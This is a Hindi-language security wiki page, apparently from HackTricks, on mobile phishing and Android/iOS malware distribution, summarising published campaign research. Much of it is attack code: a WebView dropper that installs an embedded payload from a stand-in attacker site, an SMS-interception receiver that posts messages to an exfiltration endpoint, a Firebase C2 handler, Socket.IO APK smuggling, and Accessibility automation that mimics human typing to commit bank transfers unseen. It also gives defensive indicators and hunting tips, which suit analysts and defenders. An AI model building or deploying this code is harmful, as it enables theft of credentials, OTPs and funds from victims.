# मोबाइल फ़िशिंग & मैलिशियस ऐप वितरण (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> यह पेज उन तकनीकों को कवर करता है जिन्हें threat actors उपयोग करते हैं ताकि वे **malicious Android APKs** और **iOS mobile-configuration profiles** को फ़िशिंग (SEO, social engineering, fake stores, dating apps, आदि) के माध्यम से वितरित कर सकें।
> सामग्री SarangTrap अभियान (Zimperium zLabs द्वारा उजागर, 2025) और अन्य सार्वजनिक शोध से अनुकूलित है।

## Attack Flow

1. **SEO/Phishing Infrastructure**
* देखने में मिलते-जुलते दर्जनों डोमेन रजिस्टर करें (dating, cloud share, car service…).
– Google में रैंक करने के लिए `<title>` एलिमेंट में स्थानीय भाषा के कीवर्ड और emojis का उपयोग करें।
– लैंडिंग पेज पर *दोनों* Android (`.apk`) और iOS इंस्टॉल निर्देश होस्ट करें।
2. **First Stage Download**
* Android: सीधे लिंक एक *unsigned* या “third-party store” APK के लिए।
* iOS: `itms-services://` या सामान्य HTTPS लिंक जो एक मैलिशियस **mobileconfig** प्रोफ़ाइल की ओर जाता है (नीचे देखें)।
3. **Post-install Social Engineering**
* पहली बार चलाने पर ऐप एक **invitation / verification code** मांगता है (विशेष पहुँच का भ्रम)।
* कोड Command-and-Control (C2) को **HTTP पर POST** किया जाता है।
* C2 `{"success":true}` के साथ जवाब देता है ➜ मालवेयर आगे चलता है।
* Sandbox / AV dynamic analysis जो कभी वैध कोड सबमिट नहीं करता, **कोई malicious behaviour नहीं** देखता (evasion)।
4. **Runtime Permission Abuse** (Android)
* Dangerous permissions केवल सकारात्मक C2 रिस्पॉन्स के बाद ही मांगे जाते हैं:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* हाल के वेरिएंट्स `AndroidManifest.xml` से SMS के लिए `<uses-permission>` **हटा देते हैं** लेकिन Java/Kotlin कोड पाथ जो reflection के माध्यम से SMS पढ़ता है उसे छोड़ देते हैं ⇒ इससे static स्कोर कम होता है पर उन डिवाइसेज़ पर अभी भी कार्यशील रहता है जो `AppOps` abuso या पुराने लक्ष्य के कारण अनुमति देते हैं।
5. **Facade UI & Background Collection**
* ऐप स्थानीय रूप से harmless views (SMS viewer, gallery picker) दिखाता है।
* इसी बीच यह एक्सफ़िल्ट्रेट (निकालता) करता है:
- IMEI / IMSI, फोन नंबर
- पूरा `ContactsContract` dump (JSON array)
- `/sdcard/DCIM` से JPEG/PNG, आकार कम करने के लिए [Luban](https://github.com/Curzibn/Luban) से compress किया गया
- वैकल्पिक SMS content (`content://sms`)
Payloads को **batch-zipped** करके भेजा जाता है via `HTTP POST /upload.php`।
6. **iOS Delivery Technique**
* एक single **mobile-configuration profile** `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` आदि अनुरोध कर सकता है ताकि डिवाइस को “MDM”-जैसे supervision में enroll किया जा सके।
* Social-engineering निर्देश:
1. Settings खोलें ➜ *Profile downloaded*.
2. *Install* पर तीन बार टैप करें (phishing पेज पर स्क्रीनशॉट)।
3. अनसाइन किए गए प्रोफ़ाइल को Trust करें ➜ हमलावर को *Contacts* और *Photo* entitlement मिल जाता है बिना App Store review के।
7. **Network Layer**
* सामान्य HTTP, अक्सर पोर्ट 80 पर HOST हेडर जैसे `api.<phishingdomain>.com` के साथ।
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (कोई TLS नहीं → आसानी से पकड़ा जा सकता है)।

## Red-Team Tips

* **Dynamic Analysis Bypass** – malware आकलन के दौरान, invitation code चरण को Frida/Objection से automate करें ताकि malicious ब्रांच तक पहुँचा जा सके।
* **Manifest vs. Runtime Diff** – `aapt dump permissions` की तुलना runtime `PackageManager#getRequestedPermissions()` के साथ करें; गायब dangerous perms एक रेड फ्लैग है।
* **Network Canary** – कोड एंट्री के बाद अस्थिर POST बर्स्ट का पता लगाने के लिए `iptables -p tcp --dport 80 -j NFQUEUE` कॉन्फ़िगर करें।
* **mobileconfig Inspection** – macOS पर `security cms -D -i profile.mobileconfig` का उपयोग करके `PayloadContent` सूचीबद्ध करें और अत्यधिक entitlements पहचानें।

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## संकेतक (सामान्य)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

यह पैटर्न उन अभियानों में देखा गया है जो सरकारी-लाभ थीम का दुरुपयोग करके भारतीय UPI क्रेडेंशियल और OTPs चुराते हैं। ऑपरेटर्स डिलीवरी और रेजिलिएंस के लिए विश्वसनीय प्लेटफ़ॉर्म्स को श्रृंखला के रूप में जोड़ते हैं।

### Delivery chain across trusted platforms
- YouTube पर लुभाने वाला वीडियो → विवरण में एक शॉर्ट लिंक होता है
- शॉर्टलिंक → GitHub Pages पर एक phishing साइट जो वैध पोर्टल की नकल करती है
- उसी GitHub repo में एक APK होस्ट होता है जिस पर नकली “Google Play” बैज है जो सीधे फ़ाइल से लिंक करता है
- Dynamic phishing पेज Replit पर होस्ट होते हैं; remote command चैनल Firebase Cloud Messaging (FCM) का उपयोग करता है

### Dropper with embedded payload and offline install
- पहला APK एक इंस्टॉलर (dropper) होता है जो वास्तविक मैलवेयर को `assets/app.apk` में शामिल करता है और क्लाउड डिटेक्शन को कम करने के लिए उपयोगकर्ता को Wi‑Fi/mobile data बंद करने के लिए प्रेरित करता है।
- The embedded payload एक भोले-भाले लेबल (उदा., “Secure Update”) के तहत इंस्टॉल होता है। इंस्टॉल के बाद, इंस्टॉलर और payload दोनों अलग-अलग apps के रूप में मौजूद रहते हैं।

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### shortlink के माध्यम से डायनामिक endpoint खोज
- Malware एक plain-text, comma-separated सूची live endpoints की एक shortlink से फेच करता है; सरल string transforms अंतिम phishing पेज के path का निर्माण करते हैं।

Example (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-code:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-आधारित UPI क्रेडेंशियल हार्वेस्टिंग
- “Make payment of ₹1 / UPI‑Lite” चरण WebView के अंदर डायनामिक endpoint से हमलावर का HTML फ़ॉर्म लोड करता है और संवेदनशील फ़ील्ड (फोन, बैंक, UPI PIN) को कैप्चर करता है, जिन्हें `POST` करके `addup.php` पर भेजा जाता है।

न्यूनतम लोडर:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### स्व-प्रसार और SMS/OTP इंटरसेप्शन
- पहली बार चलाने पर आक्रामक अनुमतियाँ मांगी जाती हैं:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Contacts को लूप करके पीड़ित के डिवाइस से smishing SMS बड़े पैमाने पर भेजे जाते हैं।
- Incoming SMS को एक broadcast receiver द्वारा intercept किया जाता है और metadata (sender, body, SIM slot, per-device random ID) के साथ `/addsm.php` पर upload किया जाता है।

Receiver का स्केच:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) एक लचीला C2 के रूप में
- payload FCM में रजिस्टर होता है; push messages में `_type` फ़ील्ड होती है, जिसका उपयोग actions को ट्रिगर करने के लिए switch के रूप में किया जाता है (उदा., phishing text टेम्पलेट्स को अपडेट करना, व्यवहारों को टॉगल करना).

FCM payload का उदाहरण:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
हैंडलर स्केच:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicators/IOCs
- APK में सेकेंडरी पेलोड होता है `assets/app.apk`
- WebView `gate.htm` से भुगतान लोड करता है और `/addup.php` पर exfiltrates
- SMS exfiltration `/addsm.php` पर
- Shortlink-प्रेरित config fetch (e.g., `rebrand.ly/*`) जो CSV endpoints लौटाता है
- Apps जिन्हें generic “Update/Secure Update” के रूप में लेबल किया गया है
- Untrusted apps में FCM `data` messages जिनमें `_type` discriminator होता है

---

## Socket.IO/WebSocket-आधारित APK Smuggling + नकली Google Play Pages

हमलावर अब स्थिर APK लिंक की जगह अक्सर Google Play जैसा दिखने वाले लुभावनों में embedded Socket.IO/WebSocket चैनल रखते हैं। यह payload URL को छिपाता है, URL/extension filters को बायपास करता है, और एक वास्तविक दिखने वाला install UX बनाए रखता है।

वाइल्ड में देखे गए सामान्य क्लाइंट फ्लो:

<details>
<summary>Socket.IO नकली Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Why it evades simple controls:
- कोई स्थिर APK URL उजागर नहीं होता; payload को WebSocket फ्रेम्स से मेमोरी में पुनर्निर्मित किया जाता है।
- URL/MIME/extension फिल्टर्स जो सीधे .apk प्रतिक्रियाओं को ब्लॉक करते हैं, वे WebSockets/Socket.IO के माध्यम से टनेल किए गए बाइनरी डेटा को मिस कर सकते हैं।
- Crawlers और URL sandboxes जो WebSockets का निष्पादन नहीं करते, वे payload को प्राप्त नहीं कर पाएंगे।

See also WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn केस स्टडी

The RatOn banker/RAT campaign (ThreatFabric) एक ठोस उदाहरण है कि कैसे आधुनिक mobile phishing ऑपरेशन्स WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, और यहाँ तक कि NFC-relay orchestration को मिलाकर काम करते हैं। यह सेक्शन reusable techniques का सार प्रस्तुत करता है।

### Stage-1: WebView → native install bridge (dropper)
हमलावर एक WebView दिखाते हैं जो हमलावर पेज की ओर इशारा करता है और एक JavaScript interface inject करते हैं जो एक native installer को एक्सपोज़ करता है। HTML बटन पर टैप native कोड में कॉल करता है जो dropper के assets में bundled दूसरे-स्टेज APK को install करता है और फिर उसे सीधे लॉन्च कर देता है।

Minimal pattern:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

पेज पर HTML:
```html
<button onclick="bridge.installApk()">Install</button>
```
इंस्टॉल के बाद, dropper explicit package/activity के माध्यम से payload शुरू करता है:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: अविश्वसनीय ऐप्स `addJavascriptInterface()` को कॉल कर रहे हैं और WebView को installer-like methods एक्सपोज़ कर रहे हैं; APK `assets/` के तहत एक embedded secondary payload शिप कर रहा है और Package Installer Session API को invoke कर रहा है।

### अनुमति फ़नल: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 एक WebView खोलता है जो “Access” पेज होस्ट करता है। उसका बटन एक exported method को invoke करता है जो विक्टिम को Accessibility settings पर ले जाता है और rogue service को सक्षम करने का अनुरोध करता है। एक बार अनुमति मिलने के बाद, malware Accessibility का उपयोग करके बाद के runtime permission dialogs (contacts, overlay, manage system settings, आदि) में auto-click कर देता है और Device Admin का अनुरोध करता है।

- Accessibility प्रोग्रामेटिकली बाद के prompts स्वीकार करने में मदद करता है, node-tree में “Allow”/“OK” जैसे बटनों को ढूंढकर और क्लिक dispatch करके।
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
देखें:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### ओवरले phishing/ransom via WebView
Operators कमांड जारी कर सकते हैं:
- URL से फुल-स्क्रीन ओवरले रेंडर करना, या
- इनलाइन HTML पास करना जो WebView ओवरले में लोड हो।

संभावित उपयोग: coercion (PIN entry), wallet खोलकर PIN कैप्चर करना, ransom messaging। सुनिश्चित करें कि अगर गायब हो तो ओवरले अनुमति (overlay permission) प्रदान की गई है — इसके लिए एक कमांड रखें।

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: periodically Accessibility node tree को डंप करें, दिखाई देने वाले texts/roles/bounds को सीरियलाइज़ करके C2 को pseudo-screen के रूप में भेजें (commands like `txt_screen` once and `screen_live` continuous)।
- High-fidelity: MediaProjection अनुरोध करें और मांग पर screen-casting/recording शुरू करें (commands like `display` / `record`)।

### ATS playbook (bank app automation)
एक JSON task दिए जाने पर, bank app खोलें, Accessibility के माध्यम से UI को text queries और coordinate taps के मिश्रण से ड्राइव करें, और जब पूछा जाए तो पीड़ित का payment PIN दर्ज करें।

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "नया भुगतान"
- "Zadat platbu" → "भुगतान दर्ज करें"
- "Nový příjemce" → "नया प्राप्तकर्ता"
- "Domácí číslo účtu" → "घरेलू खाता संख्या"
- "Další" → "अगला"
- "Odeslat" → "भेजें"
- "Ano, pokračovat" → "हाँ, जारी रखें"
- "Zaplatit" → "भुगतान करें"
- "Hotovo" → "हो गया"

ऑपरेटर `check_limit` और `limit` जैसे कमांड्स के माध्यम से transfer limits को भी जांच/बढ़ा सकते हैं, जो limits UI में समान रूप से नेविगेट करते हैं।

### Crypto wallet seed extraction
लक्ष्य: MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. भाषाओं में नेविगेशन को स्थिर करने के लिए locale-aware selectors (EN/RU/CZ/SK) लागू करें।

### Device Admin coercion
Device Admin APIs का उपयोग PIN-capture के अवसर बढ़ाने और पीड़ित को परेशान करने के लिए किया जाता है:

- Immediate lock:
```java
dpm.lockNow();
```
- वर्तमान credential की अवधि समाप्त करें ताकि परिवर्तन मजबूर हो (Accessibility नए PIN/password को कैप्चर करता है):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- keyguard की बायोमेट्रिक फीचर्स को अक्षम करके गैर-बायोमेट्रिक अनलॉक मजबूर करें:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
नोट: हालिया Android पर कई DevicePolicyManager नियंत्रणों के लिए Device Owner/Profile Owner आवश्यक होते हैं; कुछ OEM बिल्ड ढीले हो सकते हैं। हमेशा लक्षित OS/OEM पर सत्यापित करें।

### NFC relay orchestration (NFSkate)
Stage-3 एक external NFC-relay module (उदा., NFSkate) इंस्टॉल और लॉन्च कर सकता है और रिले के दौरान पीड़ित का मार्गदर्शन करने के लिए इसे एक HTML टेम्पलेट भी दे सकता है। इससे online ATS के साथ-साथ contactless card-present cash-out सक्षम होता है।

पृष्ठभूमि: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

Threat actors तेजी से Accessibility-आधारित automation को ऐसे anti-detection के साथ मिलाते जा रहे हैं जो बुनियादी व्यवहार-आधारित बायोमेट्रिक्स के खिलाफ tuned हैं। एक हालिया banker/RAT में दो पूरक text-delivery मोड और एक ऑपरेटर टॉगल दिखता है जो randomized cadence के साथ मानव टाइपिंग का अनुकरण करता है।

- Discovery mode: क्रियान्वयन से पहले इनपुट्स को सटीक रूप से लक्षित करने के लिए selectors और bounds के साथ दिखाई देने वाले nodes को enumerate करें (ID, text, contentDescription, hint, bounds)।
- Dual text injection:
- Mode 1 – `ACTION_SET_TEXT` सीधे target node पर (stable, no keyboard);
- Mode 2 – clipboard set + `ACTION_PASTE` को focused node में पेस्ट करें (जब direct setText blocked हो तो काम करता है)।
- Human-like cadence: ऑपरेटर-प्रदान किए गए स्ट्रिंग को विभाजित करें और इसे character-by-character दें, घटनाओं के बीच randomized 300–3000 ms की देरी के साथ ताकि “machine-speed typing” heuristics को चालाकी से टाला जा सके। इसे या तो `ACTION_SET_TEXT` के माध्यम से मान को धीरे-धीरे बढ़ाकर लागू किया जा सकता है, या एक-एक कर अक्षर पेस्ट करके।

<details>
<summary>Java स्केच: node discovery + setText या clipboard+paste के माध्यम से प्रति-अक्षर देरी वाला इनपुट</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

धोखाधड़ी को छुपाने के लिए ब्लॉकिंग ओवरले:
- पूरे-स्क्रीन `TYPE_ACCESSIBILITY_OVERLAY` रेंडर करें जिसकी ऑपरेटर-नियंत्रित अपारदर्शिता हो; इसे पीड़ित के लिए अपारदर्शी रखें जबकि रिमोट ऑटोमेशन इसके नीचे चलता रहे।
- आमतौर पर उपलब्ध कमांड: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

समायोज्य alpha के साथ न्यूनतम ओवरले:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
अक्सर देखे जाने वाले Operator control primitives: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (स्क्रीन शेयरिंग).

## संदर्भ

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
